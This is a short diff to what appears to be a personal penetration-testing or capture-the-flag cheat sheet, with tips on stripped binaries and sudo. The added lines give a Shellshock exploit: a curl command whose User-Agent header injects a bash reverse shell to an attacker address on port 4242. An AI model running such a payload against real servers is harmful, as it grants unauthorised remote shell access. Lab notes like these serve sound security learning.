@@ -76,3 +76,7 @@ Dealing with stripped binaries https://reverseengineering.stackexchange.com/ques
 
 ## sudo
 if you got something juicy in sudo -l , but still cant read get the command to work, try impersonating another user with -u
+
+### shellshock
+curl 10.10.10.xx/cgi-bin/user.sh -H "User-Agent: () { :; };echo; echo;  /bin/bash -i >& /dev/tcp/10.10.14.xx/4242 0>&1'"
+
